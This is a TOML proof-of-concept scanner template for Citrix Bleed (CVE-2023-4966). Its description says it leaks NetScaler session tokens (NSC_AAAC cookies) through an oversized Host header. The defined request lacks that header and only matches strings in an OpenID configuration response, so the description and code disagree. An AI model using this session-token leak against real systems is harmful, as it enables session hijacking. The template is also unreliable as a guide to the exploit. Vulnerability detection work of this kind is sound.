[info]
id = "POC-AVE-2023-0003"
name = "Citrix Bleed 会话令牌泄露 PoC"
author = "AVE"
severity = "high"
tags = ["citrix", "netscaler", "info-leak", "session-hijack", "cve-2023-4966"]
description = "Citrix NetScaler ADC 和 NetScaler Gateway 信息泄露漏洞（CVE-2023-4966），发送带超大 Host 头的 HTTP 请求触发内存泄露，从响应中提取有效会话令牌（NSC_AAAC Cookie）"
vuln_id = ["CVE-2023-4966", "AVE-2023-0003"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/oauth/idp/.well-known/openid-configuration"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["issuer"]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["NSC_AAAC"]
expect = true
